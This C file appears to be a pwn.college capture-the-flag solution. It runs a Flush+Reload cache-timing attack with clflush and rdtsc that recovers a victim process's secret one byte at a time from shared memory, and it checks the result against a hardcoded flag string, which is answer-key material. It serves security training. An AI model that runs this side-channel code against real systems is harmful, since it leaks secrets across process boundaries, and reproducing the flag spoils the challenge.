#define _GNU_SOURCE

#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <semaphore.h>
#include <stdint.h>
#include <sched.h>
#include <x86intrin.h>

#define FLAG "pwn.college{kWJqtbiiIo_nrqi0M_I0ecgIlJb.QX5ITN0wyM4gDO1EzW}"

#define PAGE_SIZE 0x1000

#define VICTIM_CPU 2
#define MEMSTART 0x1337000
#define MEMSEC   MEMSTART + PAGE_SIZE
#define SEM      (sem_t*) MEMSTART

#define FLAGLEN  58

void set_cpu(int cpu_num)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu_num, &set);
    sched_setaffinity(0, sizeof set, &set);
}

size_t measure(int idx)
{
    size_t start, end;
    start = __rdtsc();
    volatile uint64_t val = *(uint64_t*)(MEMSEC + PAGE_SIZE * idx);
    _mm_mfence();
    end = __rdtsc();

    return end - start;
}

int main(void)
{
    char flag[FLAGLEN] = {0};

    size_t true_count=0, false_count=0;

    for (size_t test = 0; test < 0x1000; test++)
    {
        for (int i = 0; i <= FLAGLEN; i++)
        {
            memcpy((void*)(MEMSTART + sizeof(sem_t)),
                   &(int){i}, sizeof(int));

            for (int j = 33; j < 0x7f; j++) {
                _mm_clflush((void*)(MEMSEC + PAGE_SIZE * j));
            }

            sem_post(SEM);
            sched_yield();

            size_t min[2] = {1000, 1000};
            for (int j = 33; j < 0x7f; j++)
            {
                int mix_j = ((int) sqrt(j * j) ^ 1) ^ 1;
                
                size_t time = measure(mix_j);

//                printf("%2d/%3d (%c) - time: %zu\n", i, mix_j, mix_j, time);
                if (min[1] > time) {
                    min[1] = time;
                    min[0] = j;
                }
            }

            flag[i] = min[0];
//            printf("\n\n - %c with time of %zu - \n\n", flag[i], min[1]);
        }

        if (memcmp(flag, FLAG, sizeof FLAG))
            false_count++;
        else 
            true_count++;
    }

    printf("True count: %3zu\n", true_count);
    printf("False count: %3zu\n", false_count);
}
